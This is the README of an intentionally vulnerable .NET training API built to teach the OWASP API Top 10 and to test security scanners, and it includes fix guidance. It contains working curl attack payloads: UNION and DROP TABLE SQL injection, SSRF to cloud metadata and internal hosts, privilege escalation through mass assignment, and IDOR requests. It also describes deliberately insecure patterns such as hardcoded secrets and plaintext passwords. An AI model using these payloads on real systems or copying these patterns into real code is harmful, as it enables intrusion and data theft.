# ?? Damn Vulnerable Web API (DVWA)

## ?? WARNING - EDUCATIONAL PURPOSE ONLY

This is an **intentionally vulnerable** .NET 8 Web API designed for **security training and testing purposes**. 

**DO NOT deploy this application in any production environment or public network!**

This project demonstrates common vulnerabilities from the **OWASP API Security Top 10 (2023/2025)** and is intended for:
- Security training and education
- Testing SAST tools (SonarQube, Semgrep, etc.)
- Testing DAST tools (OWASP ZAP, Burp Suite, etc.)
- Learning secure coding practices by understanding what NOT to do

## ?? Implemented Vulnerabilities

### 1. API1:2023 - Broken Object Level Authorization (BOLA/IDOR)
**Location:** `UserController.GetUserById()`

Any authenticated user can access any other user's sensitive information by simply changing the ID in the URL.

**Test:**
```bash
# Login as john (ID: 2)
curl -X POST http://localhost:5000/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username":"john","password":"12345"}'

# Access admin user data (ID: 1) without authorization
curl -X GET http://localhost:5000/api/user/1 \
  -H "Authorization: Bearer {john_token}"
```

**Impact:** Unauthorized access to sensitive data including credit cards, addresses, personal information.

---

### 2. API2:2023 - Broken Authentication
**Locations:** `AuthController`, `Program.cs`, `appsettings.json`

Multiple authentication failures:
- Hardcoded JWT secret key in source code
- Weak password policy (allows "12345", "password")
- Plain text password storage
- Excessive token expiration (365 days)
- Passwords logged to console/files

**Test:**
```bash
# Register with weak password
curl -X POST http://localhost:5000/api/auth/register \
  -H "Content-Type: application/json" \
  -d '{"username":"hacker","password":"123","email":"hack@test.com","fullName":"Hacker"}'

# Login successful with weak password
curl -X POST http://localhost:5000/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username":"hacker","password":"123"}'
```

**Impact:** Account takeover, unauthorized access, token forgery.

---

### 3. API3:2023 - Broken Object Property Level Authorization (Mass Assignment)
**Location:** `UserController.UpdateUser()`

Users can update properties they shouldn't have access to, including the `IsAdmin` flag.

**Test:**
```bash
# Login as regular user
TOKEN=$(curl -X POST http://localhost:5000/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username":"john","password":"12345"}' | jq -r '.token')

# Escalate privileges by setting IsAdmin = true
curl -X PUT http://localhost:5000/api/user/2 \
  -H "Authorization: Bearer $TOKEN" \
-H "Content-Type: application/json" \
  -d '{
    "id":2,
    "username":"john",
    "email":"john@vulnerable.api",
    "password":"12345",
    "fullName":"John Doe Admin",
    "phoneNumber":"555-0002",
  "address":"456 User Lane",
    "isAdmin":true
  }'
```

**Impact:** Privilege escalation, unauthorized administrative access.

---

### 4. SQL Injection
**Location:** `ProductController.SearchProducts()`, `SearchByPrice()`, `GetProductById()`

Raw SQL queries with string concatenation instead of parameterized queries.

**Test:**
```bash
# Basic SQL Injection
curl "http://localhost:5000/api/product/search?keyword=' OR '1'='1"

# Union-based injection to extract user data
curl "http://localhost:5000/api/product/search?keyword=' UNION SELECT id, username, password, email, 0, 0, 'hacked', created_at FROM \"Users\"--"

# Boolean-based blind injection
curl "http://localhost:5000/api/product/search-by-price?minPrice=1 AND 1=1--&maxPrice=1000"

# Error-based injection
curl "http://localhost:5000/api/product/1 OR 1=1--"
```

**Impact:** Data breach, unauthorized data access, database compromise.

---

### 5. API7:2023 - Server Side Request Forgery (SSRF)
**Location:** `UtilityController.FetchImage()`, `TriggerWebhook()`, `Proxy()`

The API fetches content from user-provided URLs without validation.

**Test:**
```bash
# Access internal network resources
curl "http://localhost:5000/api/utility/fetch-image?url=http://localhost:5000/api/user/1"

# Access cloud metadata (AWS)
curl "http://localhost:5000/api/utility/fetch-image?url=http://169.254.169.254/latest/meta-data/"

# Port scanning
curl "http://localhost:5000/api/utility/fetch-image?url=http://192.168.1.1:22"

# Webhook SSRF
curl -X POST "http://localhost:5000/api/utility/webhook?webhookUrl=http://internal-service:8080/admin" \
  -H "Content-Type: application/json" \
  -d '{"action":"delete","target":"all"}'
```

**Impact:** Internal network scanning, cloud metadata access, internal service attacks.

---

### 6. API8:2023 - Security Misconfiguration
**Locations:** `Program.cs`, Swagger configuration, Error handling

Multiple misconfigurations:
- CORS allows all origins (`*`)
- Detailed error messages with stack traces in production
- Swagger enabled in all environments
- Developer exception page enabled
- No HTTPS enforcement
- Sensitive information in health endpoints

**Test:**
```bash
# Trigger error to see stack trace
curl "http://localhost:5000/api/product/search?keyword='; DROP TABLE Users;--"

# Access health endpoint (information disclosure)
curl "http://localhost:5000/api/utility/health"

# Swagger is publicly accessible
curl "http://localhost:5000/swagger/v1/swagger.json"
```

**Impact:** Information disclosure, easier exploitation of other vulnerabilities.

---

### 7. Sensitive Data Logging
**Locations:** `AuthController.Login()`, multiple locations

Passwords, tokens, and sensitive data logged to console and log files.

**Check logs:**
```bash
docker logs vulnerable-api | grep -i "password\|token\|credit"
```

**Impact:** Credential theft, session hijacking through log files.

---

## ?? Quick Start

### Prerequisites
- Docker & Docker Compose
- .NET 8 SDK (for local development)
- Git

### Using Docker (Recommended)

1. **Clone the repository:**
```bash
git clone <repository-url>
cd VulnerableAPI
```

2. **Build and run with Docker Compose:**
```bash
docker-compose up --build
```

3. **Access the application:**
- API: http://localhost:5000
- Swagger UI: http://localhost:5000
- Adminer (Database): http://localhost:8080
  - Server: postgres
  - Username: postgres
  - Password: postgres123
  - Database: vulnerabledb

### Local Development

1. **Start PostgreSQL:**
```bash
docker run --name vulnerable-postgres -e POSTGRES_PASSWORD=postgres123 -e POSTGRES_DB=vulnerabledb -p 5432:5432 -d postgres:16-alpine
```

2. **Update connection string in appsettings.json:**
```json
"ConnectionStrings": {
  "DefaultConnection": "Host=localhost;Port=5432;Database=vulnerabledb;Username=postgres;Password=postgres123"
}
```

3. **Run the API:**
```bash
cd VulnerableAPI
dotnet restore
dotnet run
```

---

## ?? Testing with Security Tools

### SAST - SonarQube

```bash
# Install SonarScanner
dotnet tool install --global dotnet-sonarscanner

# Start analysis
dotnet sonarscanner begin /k:"VulnerableAPI" /d:sonar.host.url="http://localhost:9000"

# Build
dotnet build

# End analysis
dotnet sonarscanner end
```

**Expected findings:**
- Hardcoded credentials
- SQL injection vulnerabilities
- Weak cryptography
- Information disclosure
- Insecure authentication

### DAST - OWASP ZAP

1. **Import OpenAPI spec:**
```bash
# Get Swagger JSON
curl http://localhost:5000/swagger/v1/swagger.json > swagger.json
```

2. **In ZAP:**
   - File ? Import ? OpenAPI Definition
 - Select the swagger.json file
   - Configure target URL: http://localhost:5000
   - Run Active Scan

**Expected findings:**
- SQL Injection
- SSRF
- IDOR/BOLA
- Security misconfigurations
- Information disclosure

### Manual Testing with cURL

See vulnerability sections above for specific test commands.

---

## ?? Default Test Accounts

| Username | Password | IsAdmin | Description |
|----------|----------|---------|-------------|
| admin | admin123 | true | Administrator account |
| john | 12345 | false | Regular user with weak password |
| jane | password | false | Regular user with common password |

---

## ??? Project Structure

```
VulnerableAPI/
??? Controllers/
?   ??? AuthController.cs        # Authentication vulnerabilities
?   ??? UserController.cs      # BOLA/IDOR, Mass Assignment
?   ??? ProductController.cs     # SQL Injection
?   ??? UtilityController.cs     # SSRF, Misconfigurations
?   ??? WeatherForecastController.cs
??? Data/
?   ??? VulnerableDbContext.cs   # Database context with seed data
??? Models/
?   ??? User.cs            # User entity
?   ??? Product.cs  # Product entity
? ??? AuthModels.cs       # Auth DTOs
??? Program.cs      # Application configuration (vulnerable)
??? appsettings.json    # Configuration with secrets
??? Dockerfile      # Container definition
??? docker-compose.yml      # Multi-container setup
```

---

## ??? Security Recommendations (How to Fix)

For each vulnerability, here's how to fix it properly:

### 1. Fix BOLA/IDOR
```csharp
// Check if the requested resource belongs to the current user
var currentUserId = int.Parse(User.FindFirst(ClaimTypes.NameIdentifier)?.Value ?? "0");
if (id != currentUserId && !User.IsInRole("Admin"))
{
    return Forbid();
}
```

### 2. Fix Authentication
- Use ASP.NET Core Identity
- Store passwords with bcrypt/Argon2
- Use strong, environment-specific secrets (Azure Key Vault, AWS Secrets Manager)
- Implement password policies
- Use short token expiration (15-30 minutes)
- Never log sensitive data

### 3. Fix Mass Assignment
```csharp
// Use DTOs instead of entity models
public class UpdateUserDto
{
    public string FullName { get; set; }
    public string PhoneNumber { get; set; }
    // Don't expose IsAdmin property
}
```

### 4. Fix SQL Injection
```csharp
// Use parameterized queries or LINQ
var products = await _context.Products
    .Where(p => p.Name.Contains(keyword) || p.Description.Contains(keyword))
    .ToListAsync();
```

### 5. Fix SSRF
```csharp
// Validate URLs against whitelist
var allowedHosts = new[] { "example.com", "trusted-cdn.com" };
var uri = new Uri(url);
if (!allowedHosts.Contains(uri.Host))
{
    return BadRequest("URL not allowed");
}
```

### 6. Fix Security Misconfiguration
```csharp
// Only enable detailed errors in Development
if (app.Environment.IsDevelopment())
{
    app.UseDeveloperExceptionPage();
}

// Specific CORS policy
builder.Services.AddCors(options =>
{
    options.AddPolicy("ProductionPolicy", policy =>
    {
        policy.WithOrigins("https://trusted-domain.com")
 .AllowAnyMethod()
 .AllowAnyHeader();
    });
});
```

---

## ?? Learning Resources

- [OWASP API Security Top 10](https://owasp.org/www-project-api-security/)
- [OWASP Cheat Sheet Series](https://cheatsheetseries.owasp.org/)
- [Microsoft Security Best Practices](https://learn.microsoft.com/en-us/aspnet/core/security/)
- [PortSwigger Web Security Academy](https://portswigger.net/web-security)

---

## ?? License

This project is for educational purposes only. Use at your own risk.

## ?? Contributing

This is an educational project. If you find additional vulnerabilities to demonstrate or improvements to the training material, feel free to contribute.

---

## ?? DISCLAIMER

This application is **INTENTIONALLY INSECURE** and should **NEVER** be deployed in production or on public networks. The authors are not responsible for any misuse or damage caused by this application. This is for **EDUCATIONAL PURPOSES ONLY** in controlled, isolated environments.

**USE IN ISOLATED DOCKER/LAB ENVIRONMENTS ONLY!**
